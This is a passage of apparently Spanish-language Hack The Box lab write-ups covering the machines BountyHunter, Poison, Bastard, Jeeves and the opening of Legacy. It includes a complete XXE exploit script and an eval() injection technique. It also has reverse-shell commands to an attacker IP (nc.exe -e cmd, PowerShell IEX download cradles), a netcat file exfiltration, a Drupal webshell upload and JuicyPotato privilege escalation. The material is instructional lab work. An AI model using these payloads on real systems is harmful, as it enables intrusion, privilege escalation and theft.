buscar una vía para escalar privilegios.Escalada de privilegiosAl leer archivos del home se visualiza la flag y un archivo llamado contract.txt que pone lo siguiente.Hey team,I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.I set up the permissions for you to test this. Good luck.-- JohnDentro del texto hay una sección en particular donde habla de que se han seteados los permisos correctos para la validación de tickets. Esto inmediatamente nos hace pensar en que nuestro user contiene permisos especiales seteados a nivel de sudo.Esto nos dice que podemos ejecutar como root y utlizando python3.8 el script ticketValidator.py. En este caso todas las rutas se están llamando desde su path absoluto y el script es de propiedad de root, por lo que no es posible editarlo y Path Hijacking está descartado.Validando el interior del script, se verifica que no importa librerías, por lo que tampoco podríamos pensar en un Library HijackingVolviendo atrás, el archivo contracts.txt indicaba que los tickets estaban fallando en pasar la validación, esto nos hace pensar que pueden existir tickets rechazados. Dando un vistazo rápido al script ticketValidator.py vemos que lee archivos con extensión .md para su posterior análisis.Con esto, al utilizar find, encontramos unos cuantos que han sido rechazados.Al ejecutar el script, nos solicitará indicar la ruta de un “ticket” para su evaluación. Le proporcionaremos uno de los encontrados anteriormente.Y nos responde indicando el destino y posteriormente que es inválido.Bajo estas circunstancias solo restaría leer el script completo para averiguar que validaciones se están realizando y encontrar posibles vulnerabilidades que se puedan explotar. ticketValidator.py#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &amp;gt; 100: return True else: return False return Falsedef main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.closemain()Leyendo con detención el script, vemos que realiza una serie de validaciones a los “tickets” para evaluar si son validos o no. Además de esto, en una porción del código realiza un eval() de una línea en particular, por lo que nos interesa que el “ticket” pase las validaciones para que llegados a este punto, sea posible inyectar comandos.Las validaciones que hace son las siguientes: Valida que el archivo tenga extensión .md Que comience por la cadena # Skytrain Inc en la primera línea. Que comience por la cadena ## Ticket to en la segunda línea. Que comience por la cadena __Ticket Code:__ en la tercera línea. Que comience por la cadena ** en su cuarta línea. Que el número seguido de ** y delimitado por un + sea divisible por 7 y arroje como resto 4.Cumpliendo con estas condiciones, el archivo .md llegará hasta la sentencia eval() en donde se podría intentar inyectar código para su ejecución con altos privilegios.Sabiendo lo anterior, podríamos construir un archivo con este contenido: test.md# Skytrain Inc## Ticket to New Haven__Ticket Code:__**46+410Y efectivamente nuestro ticket pasó las verificaciones y ya es válido. Esto quiere decir que pasó por el eval() del código y ahora es tiempo para inyectar el comando que nos interesa. Para hacerlo es muy sencillo, solo se debe agregar un and luego de la operación matemática e importar la librería os para ejecutar una bash.Al momento de ejecutarse de nuevo y pasar por el eval() se ejecuta arbitraríamente el comando y ya se obtiene una consola como root.Recursos#/usr/bin/python3# Author: Cervant (https://brsalcedom.github.io)from bs4 import BeautifulSoupfrom termcolor import colored, cprintimport base64, argparse, json, requestsparser = argparse.ArgumentParser( description=&quot;XXE script for BountyHunter [HTB] - Cervant&quot;)parser.add_argument(&quot;mode&quot;, help=&quot;XXE mode, options: file/wrapper&quot;)parser.add_argument(&quot;filename&quot;, help=&quot;File to read/include: /etc/passwd&quot;)args = parser.parse_args()post_url = &quot;http://10.10.11.100/tracker_diRbPr00f314.php&quot;burp = { &#39;http&#39; : &#39;http://127.0.0.1:8080&#39; }headers = { &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;}mode = args.modefile = args.filenamexxe_file=&quot;&quot;&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file://{}&quot;&amp;gt; ]&amp;gt;&amp;lt;bugreport&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;&amp;lt;cwe&amp;gt;codigo&amp;lt;/cwe&amp;gt;&amp;lt;cvss&amp;gt;score&amp;lt;/cvss&amp;gt;&amp;lt;reward&amp;gt;plata&amp;lt;/reward&amp;gt;&amp;lt;/bugreport&amp;gt;&quot;&quot;&quot;.format(file)xxe_wrapper=&quot;&quot;&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource={}&quot;&amp;gt; ]&amp;gt;&amp;lt;bugreport&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;&amp;lt;cwe&amp;gt;codigo&amp;lt;/cwe&amp;gt;&amp;lt;cvss&amp;gt;score&amp;lt;/cvss&amp;gt;&amp;lt;reward&amp;gt;plata&amp;lt;/reward&amp;gt;&amp;lt;/bugreport&amp;gt;&quot;&quot;&quot;.format(file)def request(xxe): payload = base64.b64encode(xxe.encode()) post_data = { &#39;data&#39; : payload } r = requests.post(post_url,data=post_data, headers=headers) soup = BeautifulSoup(r.text, &quot;html.parser&quot;) response = str(soup.find_all(&quot;td&quot;)[1].text).strip() cprint(&quot;\\n&quot; + response, &#39;white&#39;)if __name__ == &#39;__main__&#39;: if mode == &#39;file&#39;: request(xxe_file) elif mode == &#39;wrapper&#39;: request(xxe_wrapper) else: parser.print_help() XXE Script for BountyHunter [HTB] &amp;#8617; " }, { "title": "Poison Writeup [ES] - HackTheBox", "url": "/Poison-Writeup-HackTheBox/", "categories": "HTB", "tags": "medium, log-poisoning, vnc, port-forwarding", "date": "2021-11-09 17:00:00 -0300", "snippet": "Poison es una máquina FreeBSD de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.InformaciónEnumeraciónNMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. nmap -sS --min-rate 5000 -p- -n -v 10.10.10.9 -oG allPorts.gnmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 00:23 -03Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanNmap scan report for 10.10.10.84Host is up (0.14s latency).Not shown: 36848 filtered ports, 28685 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 149.69 secondsPosteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados. nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.10.84Nmap scan report for 10.10.10.84Host is up (0.14s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)| ssh-hostkey:| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Nov 9 18:53:50 2021 -- 1 IP address (1 host up) scanned in 12.33 seconds Resumen puertos Puerto Estado Servicio 22/tcp Abierto OpenSSH 7.2 - FreeBSD 80/tcp Abierto Apache httpd 2.4.29 Ganando accesoMétodo 1El ganar acceso a esta máquina es bastante trivial, ya que al entrar al sitio web expuesto, se verá lo siguiente.Se visualiza un sitio web bastante simple que permite leer archivos locales de la máquina. Esto hace pensar inmediatamente que puede existir LFI.Al hacer una consulta al archivo ini.php como se sugiere, en la URL se lista la petición hecha a través de la variable file.Yendo un poco más allá, se puede intentar pasarle a file un archivo de sistema para validar si es posible leerlo. En este caso lo más común sería intentar listar /etc/passwd.Efectivamente se puede leer, sin necesidad de aplicar Path Traversal y se obtiene un usuario del sistema.Antes de seguir listando otros archivos del sistema, se procederá a revisar los archivos que recomendaba la web inicial, uno de ellos es listfiles.php.este archivo, como dice su propio nombre, listará todos los archivos del directorio actual y acá es donde se ve un recurso de interés: pwdbackup.txt. Al leerlo se verá que contiene una contraseña cifrada posiblemente en base64 y al menos 13 veces como indica el texto.Por el momento se guardará esta cadena en el archivo encoded-pass.txt.cat encoded-pass.txtVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=Para esto lo más cómodo será crear un script simple que realice la decodificación de esta cadena. decode bash script.#!/bin/bashif [ -z &quot;$1&quot; ]; then echo -e &quot;\\n[!] Please provide file to read.&quot; echo -e &quot;\\nUsage: ./$(basename $0) mybase64encodedfile.txt&quot; exit 0fipassword=$(cat $1)for i in {1..13}do password=$(echo &quot;$password&quot; | base64 -d)doneecho &quot;$password&quot;Con esto se obtiene la contraseña: Charix!2#4%6&amp;amp;8(0, y recordando lo revisado anteriormente, se tiene un usuario del sistema con el que probar si es posible entrar por SSH.Método 2 - Log PoisoningEscalando privilegiosAhora toca la fase de reconocimiento dentro de la máquina para buscar vías potenciales para la escalada de privilegios. Revisando el directorio home del user ya se visualiza la flag un archivo interesante: secret.zip.Al intentar descomprimir, aparece un mensaje indicando que es necesario proporcionar una contraseña pero no permite ingresarla. Debido a esto lo que se puede hacer es mover este .zip a la máquina atacante para intentar descomprimirlo.En este caso hay varias opciones, pero en esta ocasión se usará netcat para la transferencia de archivos. Máquina víctima: nc -v 10.10.14.12 443 &amp;lt; secret.zip. Máquina atacante: nc -nvlp 443 &amp;gt; secret.zip.Ya en posesión del .zip lo primero a intentar será la contraseña del user charix.Efectivamente la clave es válida pero la descompresión entrega un archivo con contenido ilegible y la herramienta file no proporciona mayor información.Continuando con la enumeración, al listar procesos se visualiza algo interesante. Listar procesos: ps -faux.Al parecer hay un servicio de VNC corriendo con el usuario root. Esta es una vía potencial para escalar privilegios si se pudiera entrar a la sesión de VNC activa, el problema es que el puerto 5901/tcp para la conexión a VNC está cerrado desde la máquina víctima.Para solventar lo anterior, se puede utilizar SSH para realizar un port forwarding.Port fordwardingEn este caso, se realizará un forwarding del puerto 5901(VNC) de la máquina Poison, hacia el puerto 8000 de la máquina local. De manera que cuando se consulte el puerto 8000 localmente, este tráfico llegará a Poison con el puerto 5901 sshpass -p &#39;Charix!2#4%6&amp;amp;8(0&#39; ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901Este comando iniciará una sesión SSH para la replicación de los puertos mencionados anteriormente, y mientras dure este proceso, se mantendrá la conexión. En el caso de que se requiera hacer lo mismo sin conectarse por consola, se puede emitir en segundo plano. sshpass -p &#39;Charix!2#4%6&amp;amp;8(0&#39; ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901 -NfConexión VNCYa teniendo el port fordwarding establecido, se puede testear la conexión al puerto con un cliente VNC.Se ingresa la password conseguida anteriormente sin tener éxito: Charix!2#4%6&amp;amp;8(0.Al buscar otras alternativas y revisar la ayuda de vncviewer se identifica una opción interesante que permite conectar a través de un archivo de autenticación.Volviendo atrás, se había conseguido un archivo que parecía estar cifrado, por lo que se podría usar este archivo secret para intentar una autenticación contra VNC.Y efectivamente el archivo permitió la conexión remota hacia la sesión VNC y paralelamente se abre la ventana, mostrando una consola bajo el conexto de root.Con esto ya estaría rooteada la máquina Poison y solo restaría buscar y leer las flags." }, { "title": "Bastard Writeup [ES] - HackTheBox", "url": "/Bastard-Writeup-HackTheBox/", "categories": "HTB", "tags": "medium", "date": "2021-11-08 15:00:00 -0300", "snippet": "Bastard es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.InformaciónEnumeraciónNMAPComo siempre, partiremos realizando un escaneo general de los 65535 puertos. nmap -sS --min-rate 5000 -p- -n -v 10.10.10.9 -oG allPorts.gnmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 15:11 -03Initiating Ping Scan at 15:11Scanning 10.10.10.9 [4 ports]Completed Ping Scan at 15:11, 0.20s elapsed (1 total hosts)Initiating SYN Stealth Scan at 15:11Scanning 10.10.10.9 [65535 ports]Discovered open port 80/tcp on 10.10.10.9Discovered open port 135/tcp on 10.10.10.9Discovered open port 49154/tcp on 10.10.10.9Completed SYN Stealth Scan at 15:11, 26.48s elapsed (65535 total ports)Nmap scan report for 10.10.10.9Host is up (0.15s latency).Not shown: 65532 filtered portsPORT STATE SERVICE80/tcp open http135/tcp open msrpc49154/tcp open unknownRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 26.84 secondsPosteriormente realizamos un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados. nmap -sC -sV -n -Pn -p80,135,49154 10.10.10.9 -oN ports.nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 15:18 -03Nmap scan report for 10.10.10.9Host is up (0.15s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 7.5|_http-generator: Drupal 7 (http://drupal.org)| http-methods:|_ Potentially risky methods: TRACE| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt|_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Microsoft-IIS/7.5|_http-title: Welcome to 10.10.10.9 | 10.10.10.9135/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds Resumen puertos Puerto Estado Servicio 80/tcp Abierto Microsoft IIS httpd 7.5 / Drupal 7 135/tcp Abierto Microsoft Windows RPC 49154/tcp Abierto Microsoft Windows RPC Enumeración webDurante la fase de escaneo, se detectó que existe el archivo robots.txt, al revisarlo encontramos que contiene múltiples rutas en él.La forma más eficiente para verificar si son válidas o no, es filtrar estas rutas y crear un pequeño diccionario para fuzzear porsteriormente con wfuzz. Para esto, utilizando curl y grep, filtraremos lo que nos interesa. curl -s http://10.10.10.9/robots.txt | awk &#39;{print $2}&#39; | grep &quot;/&quot; | grep -v &quot;http://&quot; &amp;gt; robots.txtLo siguiente será exportarlo a un archivo, el cual quedó con 36 posibles rutas.Ahora utilizando wfuzz verificaremos que rutas devuelven un código HTTP de estado exitoso. wfuzz -c --hc=403 -u http://10.10.10.9/FUZZ -w robots.txtDe aquí, lo que nos interesa es saber la versión de Drupal, para esto, la mejor opción es acceder al changelog. Drupal 7.54Ganando accesoAhora que sabemos que versión de Drupal está instalada en la máquina víctima, buscaremos posibles exploits en exploitdb. searchsploit drupal 7.xCopiaremos el exploit a nuestro directorio de trabajo. searchsploit -m 41564Lo renombraremos a exploit.php y utilizando vim revisaremos su contenido.Lo que está marcado en el recuadro rojo se debe actualizar con los datos de la máquina víctima y además especificar que contenido se subirá a la web. url &amp;gt; se debe actualizar con la ruta de drupal endpoint_path &amp;gt; endpoint rest, se utilizará para explotar el servicio. En el caso de esta máquina, ha sido renombrado a ‘rest’ filename &amp;gt; nombre del archivo que se subirá data &amp;gt; contenido del archivoEn este caso, subiremos una shell llamada webshell.php que tendrá código para ejecutar comandos a través de la variable cmd.Ejecutamos el exploit.Nos indica que nuestro archivo fué escrito a la ruta http://10.10.10.9/webshell.php. Vamos allá y veremos que efectivamente el recurso existe.Ahora, utilizando la variable cmd, le pasaremos un comando para verificar su ejecución.Con esto ya solo queda entablar una reverse shell. http://10.10.10.9/webshell.php?cmd=\\\\10.10.14.12\\Shared\\nc.exe -e cmd 10.10.14.12 443Pero antes, como siempre, compartiremos netcat a través de SMB con la ayuda de impacket y nos pondremos a la escucha de una conexión por el puerto 443.Entraremos como nt authority\\iusrEscalando privilegiosPara la escalada de privilegios, como siempre partiremos por realizar un pequeño reconomiento.Como puntos importantes, vemos lo siguiente: Windows 2008 R2 Datacenter de 64 bits. Token SeImpersonatePrivilege habilitado. Más información sobre Abusing TokensCon eso ya podemos empezar a pensar en JuicyPotato para la explotación de este token. Descargamos el binario desde Releases y lo transferimos a la máquina víctima con un servidor web python3. Primero nos moveremos a C:\\Windows\\Temp y crearemos la carpeta privesc para alojar el binario. Luego levantaremos el server web de python3 compartiendo nc.exe. python3 -m http.server 80 Descargaremos JuicyPotato.exe. certutil.exe -f -split -urlcache http://10.10.14.12/JuicyPotato.exe Y ya teniendolo en la máquina, lo ejecutaremos para obtener una nueva shell con permisos máximos. En este caso entablaremos una conexión a través del puerto 444.Lo usual es ejecutar JuicyPotato de la siguiente forma: JuicyPotato.exe -t * -l 1337 -p cmd.exe -a &quot;/c &amp;lt;COMANDO A EJECUTAR&amp;gt;&quot;Pero recibimos el mensaje recv failed with error: 10038. En este caso, tendremos que proporcionar un CLSID que sea compatible con la versión de S.O. de la máquina víctima. Este valor se puede buscar desde el mismo repositorio de JuicyPotato Juicy Potato - CLSIDDespués de mucho buscar, encontramos un CLSID que funciona.Nos responde que el comando se ejecuta como NT AUTHORITY\\SYSTEM y con estado OK.Ahora ejecutamos el comando final, para entablar la reverse shell con privilegios de administrador.Abrimos un canal para recibir la conexión.Ya estaríamos como el user NT AUTHORITY\\SYSTEM, por lo tanto, esta máquina ya se encoontraría rooteada.Por último, ya podríamos leer las flags que se encuentran en los directorios usuales." }, { "title": "Jeeves Writeup [ES] - HackTheBox", "url": "/Jeeves-Writeup-HackTheBox/", "categories": "HTB", "tags": "medium, jenkins, privesc", "date": "2021-11-01 17:00:00 -0300", "snippet": "Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.InformaciónEnumeraciónNMAPComo siempre, partiremos realizando un escaneo general de los 65535 puertos. nmap -sS -p- --min-rate 4000 -v -n -Pn 10.10.10.63 -oG allPorts.gnmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:01 -03Nmap scan report for 10.10.10.63Host is up (0.15s latency).Not shown: 65531 filtered portsPORT STATE SERVICE80/tcp open http135/tcp open msrpc445/tcp open microsoft-ds50000/tcp open ibm-db2Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 33.08 secondsPosteriormente realizamos un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados. nmap -sC -sV -p80,135,445,50000 -n -v 10.10.10.63 -oN ports.nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:06 -03Nmap scan report for 10.10.10.63Host is up (0.15s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Ask Jeeves135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open http Jetty 9.4.z-SNAPSHOT|_http-server-header: Jetty(9.4.z-SNAPSHOT)|_http-title: Error 404 Not FoundService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 5h13m41s, deviation: 0s, median: 5h13m40s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-11-02T05:20:15|_ start_date: 2021-11-02T05:13:21Nmap done: 1 IP address (1 host up) scanned in 48.61 secondsEnumeración webPartimos por verificar lo que nos encontramos en los puertos 80 y 5000. whatweb http://10.10.10.63 whatweb http://10.10.10.63:5000http://10.10.10.63En el home nos encontramos con esta página que nos invita a utilizar el buscador Ask Jeeves.Sin embargo, al darle al botón Search nos redirige a https://10.10.10.63/error.html y nos arroja un error.Al darle un vistazo al código fuente, nos enteramos que es una imagen estática que se consulta.Como no se ve nada más que pueda ser de interés, lo siguiente será realizar fuzzing sobre esta ruta. Para ello, en esta ocasión utilizaré Feroxbuster el cual es un fuzzer recursivo, buena alternativa de gobuster/wfuzz. ./feroxbuster --url http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300Y en este caso no encontramos nada adicional, por lo tanto, es tiempo de avanzar. Realizaremos el mismo proceso sobre el web server del puerto 50000http://10.10.10.63:50000Bajo esta ruta nos encontramos un home con una página de error. Además de un mensaje que nos indica la versión de jetty y un enlace que nos redirige a http://www.eclipse.org/jetty/Nuevamente no hay mucho más que ver, por lo tanto es hora del fuzzing. ./feroxbuster --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300Vemos que esta vez si tuvimos suerte y Feroxbuster nos proporciona la ruta http://10.10.10.63:50000/askjeeves como válida. Consultando el recurso visualizamos lo siguiente.Un Jenkins de versión 2.87. Como primer paso buscamos vulnerabilidades asociadas en exploitdb sin tener éxito.Ganando accesoSiguiendo adelante, intentaremos crear un proyecto nuevo para verificar si tenemos algún permiso de ejecución de tareas.En la sección Build especificamos que durante la ejecución de la tarea, queremos lanzar comandos de Windows.En primera instancia ejecutaremos un ping hacia nuestra IP para verificar si es posible ejecutar comandos.Una vez que escribimos la instrucción, guardamos el proyecto y le damos a Build Now.Posteriormente veremos una entrada en el Build history, clikamos ahí y entraremos al detalle de la ejecución de nuestra tarea.Vamos a Console Output y validamos que efectivamente el ping se emitió sin problemas.Ya esta vez intentaremos obtener nuestra reverse shell utilizando netcat compartido a través de un recurso en red SMB. Primero disponibilizamos el binario utilizando impacket. impacket-smbserver SharedFolder . -smb2supportParalelamente iniciamos un canal de escucha para el puerto 443.Modificamos la tarea para incluir la instrucción de generar una reverse shell hacia nuestra máquina por el puerto 443.Le damos a Build Now y veremos que obtendremos nuestra conexión.Tenemos acceso con el usuario kohsukeEscalando privilegiosPreparativosAntes de realizar la escalada de privilegios, realizaremos el mismo proceso anterior para obtener una reverse shell, pero en este caso, usaremos nishang para obtener una consola PowerShell. Estos son los pasos: Clonar el repositorio git clone https://github.com/samratashok/nishang Ir a nishang/shells, editar archivo Invoke-PowerShellTcp.ps1 y añadir Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 8001 al final del script. Mover el archivo a nuestro directorio de trabajo y renombrarlo como IPS.ps1. Montar un servidor web para compartir dicho archivo python3 -m http.server 80. Ponernos a la escucha de tráfico a través del puerto 8001. Ejecutar nueva tarea de Jenkins para obtener consola Powershell.powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.6/IPS.ps1&#39;)ReconocimientoYa en este punto, lo primero a realizar es un reconocimiento del sistema, para saber con que S.O. estamos tratando, que usuario somos y que permisos tenemos asignados. systeminfo whoami /privValidamos que estamos en una máquina Windows 10 Pro de 64 bits y ésta mantiene el permiso SeImpersonatePrivilege habilitado. Sabiendo esto, podríamos intentar utilizar Juicy Potato para explotarlo.ExplotaciónPrimero descargamos el binario de Juicy Potato desde Releases y lo llevamos a la máquina víctima utilizando impacket.El binario se ha exportado a la ruta C:\\Users\\Public con el nombre de JP.exe.Reverse shell con powershell .\\JP.exe -t * -l 1337 -p cmd.exe -a &quot;/c powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.12/IPS.ps1&#39;)&quot;Al igual que antes, compartiremos el archivo IPS.ps1 con un servidor web en python3, previamente configurado para entablar una conexión hacia nuestra IP por el puerto 8002.Al obtener la consola, ya seríamos NT AUTHORITY\\SYSTEM. Ahora solo restaría encontrar las flags, leer su contenido e ingresarlas en la plataforma de HTB.user.txtBuscar archivos con powershell Get-ChildItem -Path C:\\ -Recurse -Include user.txtVariación para obtener la ruta completa del archivo. Get-ChildItem -Path C:\\ -Recurse -Include user.txt | select FullNameLeyendo la flag user.txt type C:\\Users\\kohsuke\\Desktop\\user.txtroot.txtPara esta flag la cosa se complica un poco, ya que no la encontraremos por métodos convencionales. Al buscar por todos los archivos con extensión .txt dentro del home del usuario Administrator encontraremos un archivo interesante.Al leer hm.txt veremos lo siguiente. The flag is elsewhere. Look deeper.Después de muchos intentos y buscar información con el confiable Google llegamos a un artículo que explica como esconder información en un archivo utilizando ADS - Alternate Data Streams. También explica como extraer información de estos streams. Utilizando Get-Item buscaremos todos los streams de manera recursiva en la ruta C:\\Users\\Administrator\\Desktop. Get-Item C:\\Users\\Administrator\\Desktop\\*.txt -stream * Obtendremos el contenido con Get-Content especificando el nombre del stream que queremos leer. Get-Content hm.txt -stream root.txt Como se ve en la imagen, el archivo hm.txt contenía un stream llamado root.txt con el hash de la flag en su interior." }, { "title": "Legacy Writeup [ES] - HackTheBox", "url": "/Legacy-Writeup-HackTheBox/", "categories": "HTB", "tags": "cve", "date": "2021-10-25 17:00:00 -0300", "snippet": "Legacy es una de las box más sencillas de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.InformaciónEnumeraciónNMAPIniciamos con un escaneo de puertos, utilizando el método TCP SYN para agilizar el proceso. nmap -p- -sS --min-rate 4000 -n -v -Pn 10.10.10.4 -oG allPorts.gnmapNmap scan report for 10.10.10.4Host is up (0.15s latency).Not shown: 65532 filtered portsPORT STATE SERVICE139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp closed ms-wbt-serverRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 26.68 secondsNos reporta sólo dos puertos abiertos: 139,445. Con esta información, realizamos un escaner más detallado de los servicios y versiones bajo esos puertos. nmap -sC -sV -p139,445 10.10.10.4 -oN openPorts.nmapNmap scan report for 10.10.10.4Host is up (0.14s latency).PORT STATE SERVICE VERSION139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows XP microsoft-dsService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: mean: 5d00h41m11s, deviation: 2h07m16s, median: 4d23h11m11s|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:4d:63 (VMware)| smb-os-discovery:| OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: legacy| NetBIOS computer name: LEGACY\\x00| Workgroup: HTB\\x00|_ System time: 